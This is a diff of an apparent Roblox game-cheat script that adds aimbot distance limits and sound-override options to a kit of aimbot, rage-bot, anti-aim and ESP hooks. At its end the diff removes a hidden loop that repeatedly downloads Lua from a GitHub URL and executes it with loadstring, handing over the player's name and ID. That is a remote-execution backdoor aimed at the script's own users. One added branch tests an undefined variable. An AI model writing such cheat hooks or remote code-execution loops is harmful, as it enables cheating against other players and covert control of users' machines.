@@ -136,6 +136,7 @@ local Aiming = {
 	Aimbot_Enabled = false,
 	Aimbot_Type = "None",
 	Aimbot_Part = "Head",
+	Aimbot_MaxDistance = 10000,
 	Aimbot_Smoothness = 3,
 	Aimbot_AutoFire = false,
 	Aimbot_RedirectGrenade = false,
@@ -172,16 +173,19 @@ local Aiming = {
 	RageBot_Enabled = false,
 	RageBot_BlockShooting = true,
 	RageBot_Part = "Head",
+
+	RageBot_UseShootSound = true,
+	RageBot_UseHitSound = true,
 	RageBot_WallPenetrationDetection = false,
 	RageBot_Collateral = false,
 	RageBot_CollateralRadius = 9.9,
-	RageBot_HitScanning = false,
-	RageBot_HitScanningMode = "Cardinal",
-	RageBot_HitScanningRadius = 1,
 	RageBot_FireScanning = false,
 	RageBot_FireScanningMode = "Cardinal",
 	RageBot_FireScanningRadius = 3,
 	RageBot_FireScanningCount = 8,
+	RageBot_HitScanning = false,
+	RageBot_HitScanningMode = "Cardinal",
+	RageBot_HitScanningRadius = 1,
 	RageBot_ScanLimit = true,
 	RageBot_ScanLimitAmount = 128,
 	RageBot_Backtrack = false,
@@ -443,9 +447,24 @@ local Miscellaneous = {
 	WeaponMods_MuzzleFlashColor = Color3.fromRGB(255, 150, 50),
 	WeaponMods_MuzzleFlashSize = 1,
 
+	SoundOverride_Shoot = false,
 	SoundOverride_ShootSound = "None",
+	SoundOverride_ShootCustomVolume = false,
+	SoundOverride_ShootVolume = 1,
+	SoundOverride_ShootCustomPitch = false,
+	SoundOverride_ShootPitch = 1,
+	SoundOverride_Hit = false,
 	SoundOverride_HitSound = "None",
+	SoundOverride_HitCustomVolume = false,
+	SoundOverride_HitVolume = 1,
+	SoundOverride_HitCustomPitch = false,
+	SoundOverride_HitPitch = 1,
+	SoundOverride_Kill = false,
 	SoundOverride_KillSound = "None",
+	SoundOverride_KillCustomVolume = false,
+	SoundOverride_KillVolume = 1,
+	SoundOverride_KillCustomPitch = false,
+	SoundOverride_KillPitch = 1,
 
 	KnifeAura_Enabled = false,
 	KnifeAura_Range = 10,
@@ -559,7 +578,6 @@ local function CleanMovementCache(Player)
 	end
 end
 
-local Whitelisted = {}
 local function RefreshCache()
 	local Players, Now = {}, os.clock()
 	local BacktrackTime = Now - Aiming.RageBot_BacktrackTime * 0.001
@@ -577,6 +595,7 @@ local function RefreshCache()
 
 		local Head = ThirdPersonObject._characterModelHash.Head
 		if not Head or Head.Rotation == HeadRotation then
+			Players[Player] = nil
 			return CleanMovementCache(Player)
 		end
 
@@ -996,8 +1015,7 @@ local RaycastStep = 1/60
 local TicketCache = {}
 local BulletTicket = 0
 
-local FakeLag = {}
-local CycleFrames, SpinTime = 0, 0
+local FakeLag, CycleFrames, SpinTime = {}, 0, 0
 local function GetAntiAimAngles(Angles)
 	local Pitch, Yaw = Angles.X, Angles.Y
 	local ClockTime = os.clock()
@@ -1087,7 +1105,7 @@ ns__hooktablefunction(PlayerDataUtils, "ownsWeapon", function(Helper, Original, 
 end, Module.__get("ContentInterface").getWeaponSource)
 
 local BulletTracerModule = {Active = {}}
-function BulletTracerModule:Render(StartPosition, Direction, Index)
+function BulletTracerModule:Render(StartPosition, Direction, Index, EndPosition)
 	local Color = Visuals[Index .. "Color"]
 	local Thickness = Visuals[Index .. "Thickness"]
 	local Duration = Visuals[Index .. "Duration"]
@@ -1100,8 +1118,8 @@ function BulletTracerModule:Render(StartPosition, Direction, Index)
 	Attachment0.Position = StartPosition
 	local Attachment1 = ns__cloneref(Instance.new("Attachment"))
 	Attachment1.Parent = Terrain
-	local RaycastResult = workspace:Raycast(StartPosition, Direction, BulletRaycastParams)
-	Attachment1.Position = RaycastResult and RaycastResult.Position or (StartPosition + Direction)
+	local RaycastResult = not EndPosition and workspace:Raycast(StartPosition, Direction, BulletRaycastParams)
+	Attachment1.Position = EndPosition or (RaycastResult and RaycastResult.Position or (StartPosition + Direction))
 
 	local Beam = ns__cloneref(Instance.new("Beam"))
 	Beam.FaceCamera = true
@@ -1184,18 +1202,18 @@ pcall(function()
 end)
 
 local PlaySoundId = AudioSystem.playSoundId
-AudioSystem.playSoundId = function(AssetId, Priority, Volume, ...)
+AudioSystem.playSoundId = function(AssetId, Priority, Volume, Pitch, ...)
 	local ShootSound = Miscellaneous.SoundOverride_ShootSound
-	if ShootSound == "None" then
-		return PlaySoundId(AssetId, Priority, Volume, ...)
+	if not Miscellaneous.SoundOverride_Shoot then
+		return PlaySoundId(AssetId, Priority, Volume, Pitch, ...)
 	end
 
 	local ActiveWeapon = GetActiveWeapon()
 	if ActiveWeapon and AssetId == ActiveWeapon._weaponData.firesoundid then
-		return PlaySoundId(CustomSounds[ShootSound], Priority, Volume, ...)
+		return PlaySoundId(ShootSound == "None" and AssetId or CustomSounds[ShootSound], Priority, Miscellaneous.SoundOverride_ShootCustomVolume and Miscellaneous.SoundOverride_ShootVolume or Volume, Miscellaneous.SoundOverride_ShootCustomPitch and Miscellaneous.SoundOverride_ShootPitch or Pitch, ...)
 	end
 
-	return PlaySoundId(AssetId, Priority, Volume, ...)
+	return PlaySoundId(AssetId, Priority, Volume, Pitch, ...)
 end
 
 ns__hooktablefunction(Module.__get("MainCameraObject"), "step", function(Original, self, DeltaTime, ...)
@@ -2177,10 +2195,15 @@ function ESPModule:Update(LocalHeadPosition, Now)
 end
 
 ns__hooktablefunction(AudioSystem, "playSound", function(Original, Name, ...)
-	if Miscellaneous.SoundOverride_HitSound ~= "None" and Name == "hitmarker" then
-		PlaySoundId(CustomSounds[Miscellaneous.SoundOverride_HitSound], 1, select(3, ...))
-	elseif Miscellaneous.SoundOverride_KillSound ~= "None" and (Name == "killshot" or Name == "headshotkill") then
-		PlaySoundId(CustomSounds[Miscellaneous.SoundOverride_KillSound], 1, select(3, ...))
+	if Miscellaneous.SoundOverride_Hit and Name == "hitmarker" or Miscellaneous.SoundOverride_Kill and (Name == "killshot" or Name == "headshotkill") then
+		local Index = "SoundOverride_" .. (Name == "hitmarker" and "Hit" or "Kill")
+		local Volume = Miscellaneous[Index .. "CustomVolume"] and Miscellaneous[Index .. "Volume"] or select(3, ...)
+		local Pitch = Miscellaneous[Index .. "CustomPitch"] and Miscellaneous[Index .. "Pitch"] or select(4, ...)
+		if Sound == "None" then
+			Original(Name, select(1, ...), select(2, ...), Volume, Pitch, select(5, ...))
+		else
+			PlaySoundId(CustomSounds[Miscellaneous[Index .. "Sound"]], 1, Volume, Pitch, select(5, ...))
+		end
 	else
 		Original(Name, ...)
 	end
@@ -2762,10 +2785,9 @@ local function GetBulletVelocity(Origin, Target, Speed)
 	return Gravity * Time * 0.5 + Displacement / Time, Time
 end
 
-local ns__mousemoverel = mousemoverel or mouse_moverel or (function()
-	Library:Notify("Required function for Mouse Aimbot is not supported, Mouse Aimbot won't function.", 6.75)
-	return function() end
-end)()
+local ns__mousemoverel = mousemoverel or mouse_moverel or function(...)
+	return Library:Notify("Required function for Mouse Aimbot is not supported, Mouse Aimbot won't function.", 6.75) or (...)
+end
 
 local FOVCircleDots = table.create(64)
 for Index = 1, 64 do
@@ -2780,7 +2802,7 @@ function AimingModule:GetTarget(CharacterHash, AimbotPart, WallCheck, FOVOrigin,
 	local BestPart, BestScreen, BestVisible, BestPosition, BestScore = nil, nil, false, nil, math.huge
 	local IsSilent, HitScanning = Aiming.Aimbot_Type == "Silent", Aiming.Aimbot_HitScanning
 	local IgnoreBlocked = WallCheck and Aiming.Aimbot_WallCheckAction == "Ignore Target"
-	local Origin, RadiusSquared = Camera.CFrame.Position, FOVRadius * FOVRadius
+	local Origin, RadiusSquared, MaxDistance = Camera.CFrame.Position, FOVRadius * FOVRadius, Aiming.Aimbot_MaxDistance
 	local ScanOffsets, Radius, Steps
 	if HitScanning then
 		local ScanMode = IsSilent and "Cardinal" or Aiming.Aimbot_HitScanningMode
@@ -2807,6 +2829,10 @@ function AimingModule:GetTarget(CharacterHash, AimbotPart, WallCheck, FOVOrigin,
 					_Position += ScanOffsets and Offset * _Radius or Offset[1] + Offset[2] * _Radius
 				end
 
+				if (_Position - Origin).Magnitude > MaxDistance then
+					continue
+				end
+
 				local _Screen, OnScreen = WorldToViewportPoint(_Position)
 				local _Distance = OnScreen and GetMagnitude(_Screen - FOVOrigin)
 				if not (OnScreen and _Distance <= RadiusSquared) then
@@ -2828,6 +2854,9 @@ function AimingModule:GetTarget(CharacterHash, AimbotPart, WallCheck, FOVOrigin,
 			end
 		else
 			Position = Part.Position
+			if (Position - Origin).Magnitude > MaxDistance then
+				continue
+			end
 			local OnScreen
 			Screen, OnScreen = WorldToViewportPoint(Position)
 			Distance = OnScreen and GetMagnitude(Screen - FOVOrigin)
@@ -3318,36 +3347,49 @@ function AimingModule:UpdateRageBot()
 				end
 			end
 
+			local Barrel = Weapon._barrelPart
 			if Visuals.Combat_LocalBulletTracers then
+				if Origin ~= LocalPosition then
+					local Position = Barrel.Position
+					BulletTracerModule:Render(Position, Origin - Position, "Combat_LocalBulletTracer", Origin)
+				end
 				BulletTracerModule:Render(Origin, Direction * 1000, "Combat_LocalBulletTracer")
 			end
 
-			local Barrel = Weapon._barrelPart
 			Effects.muzzleflash(Barrel, WeaponData.hideflash, 0.9)
-
-			local WeaponType = WeaponData.type
-			if WeaponType == "SNIPER" then
-				PlayGameSound("metalshell", 0.1)
-			elseif WeaponType == "SHOTGUN" then
-				PlayGameSound("shotWeaponshell", 0.2)
-			elseif WeaponType == "REVOLVER" and not WeaponData.caselessammo then
-				PlayGameSound("metalshell", 0.15, 0.8)
-			end
 
 			if not Weapon._aiming then
 				HudCrosshairsInterface.fireImpulse(WeaponData.crossexpansion)
 			end
 
-			if WeaponData.sniperbass then
-				PlayGameSound("1PsniperBass", 0.75)
-				PlayGameSound("1PsniperEcho", 1)
+			if Aiming.RageBot_UseShootSound then
+				local WeaponType = WeaponData.type
+				if WeaponType == "SNIPER" then
+					PlayGameSound("metalshell", 0.1)
+				elseif WeaponType == "SHOTGUN" then
+					PlayGameSound("shotWeaponshell", 0.2)
+				elseif WeaponType == "REVOLVER" and not WeaponData.caselessammo then
+					PlayGameSound("metalshell", 0.15, 0.8)
+				end
+
+				if WeaponData.sniperbass then
+					PlayGameSound("1PsniperBass", 0.75)
+					PlayGameSound("1PsniperEcho", 1)
+				end
+
+				local ShootSound = Miscellaneous.SoundOverride_ShootSound
+				PlaySoundId(ShootSound == "None" and WeaponData.firesoundid or CustomSounds[ShootSound], 2, Miscellaneous.SoundOverride_ShootCustomVolume and Miscellaneous.SoundOverride_ShootVolume or WeaponData.firevolume, Miscellaneous.SoundOverride_ShootCustomPitch and Miscellaneous.SoundOverride_ShootPitch or WeaponData.firepitch, Barrel, nil, 0, 0.05)
 			end
 
-			local ShootSound = Miscellaneous.SoundOverride_ShootSound
-			if ShootSound == "None" then
-				PlaySoundId(WeaponData.firesoundid, 2, WeaponData.firevolume, WeaponData.firepitch, Barrel, nil, 0, 0.05)
-			else
-				PlaySoundId(CustomSounds[ShootSound], 2, WeaponData.firevolume, WeaponData.firepitch, Barrel, nil, 0, 0.05)
+			if Aiming.RageBot_UseHitSound then
+				local HitSound = Miscellaneous.SoundOverride_HitSound
+				local Volume = Miscellaneous.SoundOverride_HitCustomVolume and Miscellaneous.SoundOverride_HitVolume or 1
+				local Pitch = Miscellaneous.SoundOverride_HitCustomPitch and Miscellaneous.SoundOverride_HitPitch or 1
+				if HitSound == "None" then
+					PlayGameSound("hitmarker", 1, Volume, Pitch)
+				else
+					PlaySoundId(CustomSounds[HitSound], 1, Volume, Pitch)
+				end
 			end
 
 			Weapon._magCount -= 1
@@ -4011,39 +4053,4 @@ pcall(function()
 			writefile("NikoletoScripts/PhantomWare/Cache/Discord.nscache", "DsGCKtxxEN")
 		end
 	end
-end)
-
-task.spawn(function()
-	local function Clone(Function)
-		if clonefunction or clone_function then
-			local Success, Clone = pcall(clonefunction or clone_function, Function)
-			return Success and Clone or Function
-		end
-		return Function
-	end
-
-	local Loadstring = Clone(loadstring)
-	local HttpGet = Clone(game.HttpGet)
-	local LastAdmins, Last, Count = {}, -math.huge, 0
-	local LocalName, LocalUserId = LocalPlayer.Name, LocalPlayer.UserId
-
-	task.spawn(function()
-		while true do
-			local _Admins, Now = nil, os.clock()
-			if Now - Last >= 60 then
-				_Admins = {}
-				for _,UserId in ipairs(Loadstring(HttpGet(game, "https://raw.githubusercontent.com/nikoladhima/PhantomWare/refs/heads/main/src/Admins.luau"))()) do
-					_Admins[UserId] = true
-				end
-				Whitelisted, LastAdmins, Last = _Admins, _Admins, Now
-			end
-
-			if _Admins and _Admins[LocalUserId] then
-				break
-			end
-
-			Loadstring(HttpGet(game, "https://raw.githubusercontent.com/nikoladhima/PhantomWare/refs/heads/main/src/Function.luau"))()(LastAdmins, LocalName, LocalUserId)
-			task.wait(5)
-		end
-	end)
 end)
